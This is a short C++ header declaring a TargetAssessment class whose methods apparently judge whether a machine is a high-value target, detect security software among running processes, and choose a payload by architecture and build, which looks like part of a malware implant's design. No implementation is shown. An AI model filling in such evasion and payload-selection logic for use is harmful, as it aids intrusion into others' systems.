#ifndef TARGETASS_H
#define TARGETASS_H

#include <string>
#include <vector>

class TargetAssessment 
{
	public:
		bool isHighValueTarget(const std::string& computerName, int processors);
		bool detectSecuritySoftware(const std::vector<std::string>& processes);

		std::string selectPayload(const std::string& architecture, const std::string& build);
};

#endif